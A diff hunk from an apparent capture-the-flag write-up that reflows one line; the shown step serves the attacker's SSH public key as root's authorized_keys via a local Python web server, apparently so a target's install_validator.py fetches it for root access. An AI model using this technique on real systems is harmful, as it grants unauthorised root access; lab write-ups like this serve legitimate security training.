@@ -2125,8 +2125,7 @@ First generate a unique SSH key pair on your Kali machine.
 
 The `install_validator.py` script expects a URL. To ensure the Python web server correctly served the file when the target requested a specific path, we reconstructed that path locally.
 
-**Commands:** `mkdir -p ./root/.ssh/` `cp root_key.pub ./root/.ssh/authorized_keys` `python3 -m http.server 80` or you could run it all as:
-`mkdir -p ./root/.ssh/ && cp root_key.pub ./root/.ssh/authorized_keys && python3 -m http.server 80`
+**Commands:** `mkdir -p ./root/.ssh/` `cp root_key.pub ./root/.ssh/authorized_keys` `python3 -m http.server 80` or you could run it all as: `mkdir -p ./root/.ssh/ && cp root_key.pub ./root/.ssh/authorized_keys && python3 -m http.server 80`
 
 **Breakdown:**
 
